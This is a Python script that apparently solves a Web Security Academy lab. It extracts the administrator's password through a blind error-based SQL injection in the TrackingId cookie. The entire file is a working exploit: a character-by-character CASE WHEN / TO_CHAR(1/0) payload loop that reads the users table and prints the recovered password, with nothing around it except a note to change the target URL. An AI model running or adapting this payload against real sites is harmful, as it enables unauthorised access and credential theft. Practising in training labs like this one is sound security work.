import requests
import string 

password = '' 
url = "https://###.web-security-academy.net/" #Change the URL
alphanum = string.ascii_lowercase + string.digits #'0123456789abcdefghijklmnopqrstuvwxyz'#
alphanumList = list(alphanum)

errorText = "Internal Server Error"
passLength = 20 

for itr in range(1, passLength+1):
	found = False
	for character in alphanumList: 
		print("Trying: " + str(password) + str(character))
		payload = "' ||(SELECT CASE WHEN (SUBSTR(password,"+str(itr)+",1)='"+str(character)+"') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' ) --"  
		data = {
			"TrackingId": payload	
		}

		r = requests.get(url, cookies=data)    
		for text in r.text.split('\n'):
			if (errorText in text): 
				found = True
				password += str(character) 
				print("On "+ str(itr) +"th position found " + str(character)) 
				break
		if found:
			break
		 
print("Password: " + str(password))
